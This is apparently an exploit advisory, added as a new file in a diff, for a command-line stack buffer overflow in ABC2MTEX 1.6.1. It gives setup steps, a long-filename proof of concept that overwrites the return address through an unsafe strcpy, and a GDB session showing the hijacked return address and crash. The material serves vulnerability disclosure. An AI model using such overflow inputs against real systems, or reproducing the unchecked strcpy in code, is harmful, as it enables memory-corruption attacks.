@@ -1,0 +1,64 @@
+Exploit Title: ABC2MTEX 1.6.1 - Command Line Stack Overflow
+Date: 2019-08-13
+Exploit Author: Carter Yagemann <yagemann@gatech.edu>
+Vendor Homepage: https://abcnotation.com/abc2mtex/
+Software Link: https://github.com/mudongliang/source-packages/raw/master/CVE-2004-1257/abc2mtex1.6.1.tar.gz
+Version: 1.6.1
+Tested on: Debian Buster
+
+An unsafe strcpy at abc.c:241 allows an attacker to overwrite the return
+address from the openIn function by providing a long input filename. This
+carries similar risk to CVE-2004-1257.
+
+Setup:
+
+$ wget https://github.com/mudongliang/source-packages/raw/master/CVE-2004-1257/abc2mtex1.6.1.tar.gz
+$ tar -xzf abc2mtex1.6.1.tar.gz
+$ make
+
+$ gcc --version
+gcc (Debian 8.3.0-6) 8.3.0
+Copyright (C) 2018 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+PoC:
+
+$ ./abc2mtex AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA
+
+GDB:
+
+We're going to place a breakpoint before and after abc.c:241 to show the overflow.
+
+$ gdb -q ./abc2mtex
+Reading symbols from ./abc2mtex...done.
+(gdb) break abc.c:241
+Breakpoint 1 at 0x4139: file abc.c, line 241.
+(gdb) break abc.c:242
+Breakpoint 2 at 0x414c: file abc.c, line 242.
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA
+Starting program: /tmp/tmp.4jy8nhwOI3/abc2mtex AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA
+
+Breakpoint 1, openIn (filename=0x7fffffffe240 'A' <repeats 120 times>, "FEDCBA") at abc.c:241
+241                     (void) strcpy(savename,filename);
+(gdb) bt
+#0  openIn (filename=0x7fffffffe240 'A' <repeats 120 times>, "FEDCBA") at abc.c:241
+#1  0x0000555555556f00 in main (argc=2, argv=0x7fffffffe4f8) at fields.c:273
+(gdb) c
+Continuing.
+
+Breakpoint 2, openIn (filename=0x7fffffffe240 'A' <repeats 120 times>, "FEDCBA") at abc.c:242
+242                     (void) strcat(filename,".abc");
+(gdb) bt
+#0  openIn (filename=0x7fffffffe240 'A' <repeats 120 times>, "FEDCBA") at abc.c:242
+#1  0x0000414243444546 in ?? ()
+#2  0x00007fffffffe4f8 in ?? ()
+#3  0x0000000200000000 in ?? ()
+#4  0x0000000000000000 in ?? ()
+(gdb) c
+Continuing.
+file "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA" does not exist
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414243444546 in ?? ()
+(gdb) quit
